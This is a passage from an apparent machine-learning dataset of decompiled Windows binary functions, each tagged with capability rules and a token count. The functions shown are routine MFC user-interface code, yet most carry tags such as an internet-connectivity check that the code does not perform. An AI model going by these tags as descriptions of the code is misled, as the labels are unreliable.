iVar4 - iVar3;\n                    if ((iVar3 == 0) || (iVar4 == 0)) break;\n                } while (var_4h < arg_8h);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n                *(in_ECX + 0x2c) = *(in_ECX + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(in_ECX + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, piVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x30);\n        }\n        if (uVar2 <= *(in_ECX + 0x2c) - *(in_ECX + 0x28)) {\n            return;\n        }\n        unaff_EBX = 0;\n        unaff_ESI = 3;\n    }\n    fcn.00425c42(unaff_ESI, unaff_EBX);\n    return;\n}\n",
        "token_count": 767
    },
    "00424f68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00424f68(uint arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    puVar2 = arg_ch;\n    *arg_ch = 1;\n    fcn.004088af(&arg_ch + 3);\n    if (arg_ch._3_1_ == -1) {\n        fcn.00407980(&arg_8h + 2);\n        if (arg_8h._2_2_ == -2) {\n            *puVar2 = 2;\n            fcn.004088af(&arg_ch + 3);\n            if (arg_ch._3_1_ != -1) goto code_r0x00424fb6;\n            fcn.00407980(&arg_8h + 2);\n        }\n        if (arg_8h._2_2_ == 0xffff) {\n            fcn.00408936(&arg_ch);\n            puVar2 = arg_ch;\n            if (arg_ch == 0xffffffff) {\n                fcn.004088ee(&var_8h);\n                if ((var_4h != 0) || (puVar2 = var_8h,  0x7fffffff < var_8h)) {\n                    fcn.00425c42(1, 0);\n                    pcVar1 = swi(3);\n                    puVar2 = (*pcVar1)();\n                    return puVar2;\n                }\n            }\n        }\n        else {\n            puVar2 = arg_8h._2_2_;\n        }\n    }\n    else {\ncode_r0x00424fb6:\n        puVar2 = arg_ch >> 0x18;\n    }\n    return puVar2;\n}\n",
        "token_count": 396
    },
    "00425011": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00425011(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint32_t unaff_retaddr;\n    \n    if (param_3 != 0) {\n        fcn.004087fa(0xff);\n        fcn.00407940(0xfffe);\n    }\n    if (unaff_retaddr < 0xff) {\n        fcn.004087fa(unaff_retaddr);\n    }\n    else {\n        fcn.004087fa(0xff);\n        if (unaff_retaddr < 0xfffe) {\n            fcn.00407940(unaff_retaddr);\n        }\n        else {\n            fcn.00407940(0xffff);\n            if (unaff_retaddr == 0xffffffff) {\n                fcn.00408874(0xffffffff);\n                fcn.00408832(0xffffffff, 0);\n            }\n            else {\n                fcn.00408874(unaff_retaddr);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "004250a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004250a0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.00425c42(2, *(in_ECX + 0x14));\n        }\n        arg_10h = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < arg_10h) {\n            arg_10h = arg_ch;\n        }\n        fcn.0040b7b0(*(in_ECX + 0x28), arg_8h, arg_10h);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_10h;\n        arg_ch = arg_ch - arg_10h;\n        if (arg_ch != 0) {\n            fcn.00424e09();\n            iVar1 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + arg_10h, iVar1);\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            fcn.0040b7b0(*(in_ECX + 0x28), arg_8h + arg_10h + iVar1, arg_ch - iVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + (arg_ch - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "004251ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004251ac(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    if ((*(extraout_ECX + 0x24) != 0) && ((*(extraout_ECX + 0x18) & 2) == 0)) {\n        fcn.00425092();\n    }\n    fcn.00424c9a();\n    fcn.00401180();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 202
    },
    "0042588c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042588c(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n    uVar2 = fcn.0041eeb7(uVar2);\n    iVar3 = fcn.0041bb59(0x440288);\n    if (iVar3 != 0) {\n        if (unaff_EBX != 0) {\n            return uVar2;\n        }\n        do {\n            uVar4 = (*pcVar1)(*(param_1 + 0x1c));\n            param_1 = fcn.0041eeb7(uVar4);\n            if (param_1 == 0) {\n                return uVar2;\n            }\n            iVar3 = (*_sym.imp.USER32.dll_IsIconic)(*(param_1 + 0x1c));\n        } while (iVar3 == 0);\n    }\n    return 0;\n}\n",
        "token_count": 261
    },
    "004261fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004261fe(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = fcn.0043500e();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041baa4(0x426e5d);\n        iVar3 = fcn.0041bab6(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00423296(0x441d6c, 0x437359, 0x435f2c, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.0041baa4(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 369
    },
    "004262f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004262f0(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.004262bf();\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004264e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004264e5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = fcn.0043500e();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041baa4(0x426e5d);\n        iVar3 = fcn.0041bab6(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00423296(0x441ccc, 0x437375, 0x435f2c, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.0041baa4(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x20);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "00426ca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426ca0(int32_t hWnd, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint lpClassName;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if ((hWnd != 0) && (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar1 & 0xf) == arg_ch)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(hWnd, &lpClassName, 10);\n        (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&lpClassName, \"combobox\");\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 170
    },
    "00427580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00427580(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x44f278 == 0) {\n        *0x44f278 = 1;\n        if (*0x450d8c == 0) {\n            *0x450fd8 = 3;\n            (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x68, 0, 0x450fd8, 0);\n        }\n        else {\n            if (*0x450fe0 == 0) {\n                *0x450fdc = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"MSH_SCROLL_LINES_MSG\");\n                if (*0x450fdc == 0) {\n                    *0x450fe0 = 1;\n                    return *0x450fd8;\n                }\n                *0x450fe0 = 2;\n            }\n            if (((*0x450fe0 == 2) &&\n                (iVar1 = (*_sym.imp.USER32.dll_FindWindowA)(\"MouseZ\", \"Magellan MSWHEEL\"),  iVar1 != 0)) &&\n               (*0x450fdc != 0)) {\n                *0x450fd8 = (*_sym.imp.USER32.dll_SendMessageA)(iVar1, *0x450fdc, 0, 0);\n            }\n        }\n    }\n    return *0x450fd8;\n}\n",
        "token_count": 297
    },
    "00427760": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00427760(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00408bb5();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x120))();\n        if ((iVar2 != 0) && (piVar1[0x1f] != 0)) {\n    // WARNING: Could not recover jumptable at 0x00427786. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(*piVar1[0x1f] + 100))();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0042795e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00427891)\n// WARNING: Removing unreachable block (ram,0x004278e2)\n\nvoid fcn.0042795e(uint param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [259];\n    uchar uStack9;\n    uint uStack8;\n    \n    uStack8 = 0x427966;\n    iVar4 = fcn.00434fe8();\n    if (*(iVar4 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x00427972. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar4 + 4) + 0x98))();\n        return;\n    }\n    uStack8 = *0x44e0fc;\n    fcn.00427760(0);\n    iVar4 = fcn.0042778d(0, &stack0xfffffef0);\n    if (iVar4 != iStack272) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iVar4, 1);\n    }\n    if ((iVar4 == 0) || (piVar1 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x376, 0, 0),  piVar1 == NULL)) {\n        piVar1 = NULL;\n    }\n    iStack276 = 0;\n    if ((piVar1 != NULL) && (iStack276 = *piVar1,  param_3 != 0)) {\n        *piVar1 = param_3 + 0x30000;\n    }\n    if (((param_2 & 0xf0) == 0) && ((uVar2 = param_2 & 0xf,  uVar2 < 2 || ((2 < uVar2 && (uVar2 < 5)))))) {\n        param_2 = param_2 | 0x30;\n    }\n    auStack268[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &stack0xfffffef4, 0x104);\n    if (iVar3 == 0x104) {\n        uStack9 = 0;\n    }\n    (*_sym.imp.USER32.dll_MessageBoxA)(iVar4, param_1, &stack0xfffffef4, param_2);\n    if (piVar1 != NULL) {\n        *piVar1 = iStack276;\n    }\n    if (iStack272 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack272, 1);\n    }\n    fcn.00427760(1);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 648
    },
    "00427a89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427a89(int32_t param_1)\n\n{\n    if (*(param_1 + 0x54) != 0) {\n    // WARNING: Could not recover jumptable at 0x00427a94. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(param_1 + 0x54) + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00427b47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00427b47(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    if (*(extraout_ECX + 0x54) == 0) {\n        iVar1 = fcn.0041bab6(0x20);\n        *(unaff_EBP + -0x10) = iVar1;\n        *(unaff_EBP + -4) = 0;\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = fcn.00437ee4();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(extraout_ECX + 0x54) = uVar2;\n    }\n    (**(**(extraout_ECX + 0x54) + 0xc))(*(unaff_EBP + 8));\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 286
    },
    "00427b9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00427b9a(uint hModule, int32_t hResInfo, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar uVar5;\n    uchar extraout_AH;\n    int32_t *piVar6;\n    int32_t *arg_ch;\n    int32_t *arg_8h;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    uint uVar10;\n    uint uVar11;\n    uint hResData;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar6 = (*_sym.imp.KERNEL32.dll_LoadResource)(hModule, hResInfo);\n    piVar9 = piVar6;\n    if ((piVar6 != NULL) && (arg_ch = (*_sym.imp.KERNEL32.dll_LockResource)(piVar6),  piVar9 = arg_ch,  arg_ch != NULL))\n    {\n        iVar2 = *arg_ch;\n        arg_8h = fcn.00409f36(iVar2 + 0x40);\n        piVar9 = arg_8h;\n        if (arg_8h != NULL) {\n            fcn.0040b7b0(arg_8h, arg_ch, iVar2 + 0x40);\n            iVar2 = *arg_8h;\n            hResInfo = 0;\n            do {\n                uVar7 = 0;\n                do {\n                    if (*(arg_8h + hResInfo * 4 + iVar2) == *(uVar7 * 8 + 0x440c68)) {\n                        if (arg_10h == 0) {\n                            puVar1 = uVar7 * 8 + 0x440c6c;\n                            (*_sym.imp.USER32.dll_GetSysColor)(*puVar1);\n                            uVar5 = (*_sym.imp.USER32.dll_GetSysColor)(*puVar1);\n                            uVar7 = (*_sym.imp.USER32.dll_GetSysColor)(*puVar1);\n                            *(arg_8h + hResInfo * 4 + iVar2) = CONCAT11(uVar5, extraout_AH) << 8 | uVar7 >> 0x10 & 0xff;\n                        }\n                        else if (*(uVar7 * 8 + 0x440c6c) != 0x12) {\n                            *(arg_8h + hResInfo * 4 + iVar2) = 0xffffff;\n                        }\n                        break;\n                    }\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < 4);\n                hResInfo = hResInfo + 1;\n            } while (hResInfo < 0x10);\n            iVar2 = arg_8h[1];\n            iVar3 = arg_8h[2];\n            uVar8 = (*_sym.imp.USER32.dll_GetDC)(0);\n            piVar9 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(uVar8, iVar2, iVar3);\n            if (piVar9 != NULL) {\n                uVar10 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uVar8);\n                pcVar4 = _sym.imp.GDI32.dll_SelectObject;\n                uVar11 = (*_sym.imp.GDI32.dll_SelectObject)(uVar10, piVar9);\n                (*_sym.imp.GDI32.dll_StretchDIBits)\n                          (uVar10, 0, 0, iVar2, iVar3, 0, 0, iVar2, iVar3, arg_ch + (1 << (*(arg_8h + 0xe) & 0x1f)) + 10\n                           , arg_8h, 0, 0xcc0020);\n                (*pcVar4)(uVar10, uVar11);\n                (*_sym.imp.GDI32.dll_DeleteDC)(uVar10);\n            }\n            (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar8);\n            fcn.00409f48(arg_8h);\n            (*_sym.imp.KERNEL32.dll_FreeResource)(piVar6);\n        }\n    }\n    return piVar9;\n}\n",
        "token_count": 938
    },
    "00427de1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00427de1(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = 0;\n    iVar5 = 0;\n    var_4h = 0;\n    if (arg_ch < 1) {\ncode_r0x00427e8c:\n        return var_4h + 1;\n    }\ncode_r0x00427dff:\n    piVar1 = arg_8h + iVar6 * 0x14;\n    piVar2 = piVar1 + 2;\n    *piVar2 = *piVar2 & 0xdf;\n    if ((*piVar2 & 8) == 0) {\n        if ((*(piVar1 + 9) & 1) == 0) {\n            iVar3 = *(in_ECX + 0xa8);\n        }\n        else {\n            iVar3 = *piVar1;\n        }\n        iVar5 = iVar3 + iVar5;\n        iVar3 = iVar6;\n        if (arg_10h < iVar5) {\n            for (; (-1 < iVar3 && ((*piVar2 & 0x20) == 0)); piVar2 = piVar2 + -5) {\n                if (((*(piVar2 + 1) & 1) != 0) && ((piVar2[-1] == 0 && ((*piVar2 & 8) == 0)))) goto code_r0x00427ea2;\n                iVar3 = iVar3 + -1;\n            }\n            iVar3 = iVar6 + -1;\n            if (-1 < iVar3) {\n                puVar4 = arg_8h + 8 + iVar3 * 0x14;\n                do {\n                    if ((*puVar4 & 0x20) != 0) break;\n                    if (((*puVar4 & 8) == 0) && (((puVar4[1] & 1) == 0 || (*(puVar4 + -4) == 0))))\n                    goto code_r0x00427ea2;\n                    iVar3 = iVar3 + -1;\n                    puVar4 = puVar4 + -0x14;\n                } while (-1 < iVar3);\n            }\n        }\n    }\n    goto code_r0x00427e81;\ncode_r0x00427ea2:\n    puVar4 = arg_8h + 8 + iVar3 * 0x14;\n    *puVar4 = *puVar4 | 0x20;\n    iVar5 = 0;\n    var_4h = var_4h + 1;\n    iVar6 = iVar3;\ncode_r0x00427e81:\n    iVar6 = iVar6 + 1;\n    if (arg_ch <= iVar6) goto code_r0x00427e8c;\n    goto code_r0x00427dff;\n}\n",
        "token_count": 700
    },
    "004281d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004281d5(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = 0;\n    var_18h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    uVar2 = (**(*in_ECX + 0x110))(0x455, 0, 0);\n    if (0 < arg_10h) {\n        puVar7 = arg_ch + 9;\n        var_4h = arg_10h;\n        do {\n            arg_ch = *(puVar7 + -9);\n            uVar3 = fcn.0041cced();\n            if (((uVar3 & 0x800) == 0) && (*0x44da60 != 0x40047)) {\n                arg_ch = (arg_ch * 2) / 3;\n            }\n            if ((puVar7[-1] & 8) == 0) {\n                uVar1 = *puVar7;\n                iVar5 = in_ECX[0x2a];\n                if ((uVar1 & 1) == 0) {\n                    if (((uVar1 & 8) != 0) && ((uVar2 & 1) != 0)) {\n                        iVar5 = iVar5 + *0x44da64;\n                    }\n                    if (var_10h < var_18h + iVar5) {\n                        var_10h = var_18h + iVar5;\n                    }\n                    iVar4 = in_ECX[0x2b] + iVar6;\ncode_r0x004282a4:\n                    if (var_ch < iVar4) {\n                        var_ch = iVar4;\n                    }\n                }\n                else {\n                    if ((puVar7[-1] & 0x20) != 0) {\n                        iVar4 = in_ECX[0x2b] + iVar6 + arg_ch;\n                        goto code_r0x004282a4;\n                    }\n                    if (var_10h < *(puVar7 + -9) + var_18h) {\n                        var_10h = *(puVar7 + -9) + var_18h;\n                    }\n                }\n                if ((uVar1 & 1) != 0) {\n                    iVar5 = *(puVar7 + -9);\n                }\n                var_18h = var_18h + iVar5;\n                if ((puVar7[-1] & 0x20) != 0) {\n                    var_18h = 0;\n                    iVar6 = iVar6 + in_ECX[0x2b];\n                    if ((uVar1 & 1) != 0) {\n                        iVar6 = iVar6 + arg_ch;\n                    }\n                }\n            }\n            puVar7 = puVar7 + 0x14;\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return;\n}\n",
        "token_count": 779
    },
    "004287aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.004287aa(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint *arg_8h_00;\n    int32_t lpRect;\n    int32_t *var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t lprc;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint *var_4h;\n    \n    puVar7 = NULL;\n    arg_8h_00 = 0x418;\n    var_ch = NULL;\n    var_34h = 0;\n    var_30h = 0;\n    iVar2 = (**(*in_ECX + 0x110))(0x418, 0, 0);\n    var_1ch = iVar2;\n    if ((iVar2 == 0) || (var_ch = fcn.0041bab6(iVar2 * 0x14),  piVar4 = var_ch,  iVar2 < 1)) goto code_r0x00428a77;\n    do {\n        var_8h = piVar4;\n        arg_8h_00 = puVar7;\n        fcn.00427d22();\n        piVar8 = var_ch;\n        var_8h = var_8h + 5;\n        puVar7 = puVar7 + 1;\n        piVar4 = var_8h;\n    } while (puVar7 < iVar2);\n    if (iVar2 < 1) goto code_r0x00428a77;\n    uVar1 = in_ECX[0x1f];\n    if ((uVar1 & 2) == 0) {\n        var_20h = uVar1 & 4;\n        if (var_20h == 0) {\ncode_r0x0042889c:\n            var_38h = -((arg_ch & 2) != 0) & 0x7fff;\n        }\n        else if ((arg_ch & 4) == 0) {\n            if ((arg_ch & 8) == 0) {\n                var_38h = 0;\n                if ((arg_ch & 0x10) == 0) {\n                    if (arg_10h == -1) {\n                        if ((uVar1 & 1) == 0) goto code_r0x0042889c;\n                        goto code_r0x00428896;\n                    }\n                    (*_sym.imp.USER32.dll_SetRectEmpty)(&fcn.004287aa::lprc);\n                    (**(*in_ECX + 0x13c))(&fcn.004287aa::lprc, arg_ch & 2);\n                    var_34h = arg_ch & 0x20;\n                    if (var_34h == 0) {\n                        var_28h = var_24h - lprc;\n                    }\n                    else {\n                        var_28h = var_20h - var_28h;\n                    }\n                    var_38h = var_28h + arg_10h;\n                }\n            }\n            else {\n                var_38h = 0x7fff;\n            }\n        }\n        else {\ncode_r0x00428896:\n            var_38h = in_ECX[0x1b];\n        }\n        var_40h = piVar8;\n        lpRect = 0x4288b5;\n        var_3ch = iVar2;\n        fcn.004282f7(piVar8, iVar2, var_38h, var_34h);\n    }\n    arg_8h_00 = &fcn.004287aa::var_24h;\n    lpRect = iVar2;\n    puVar3 = 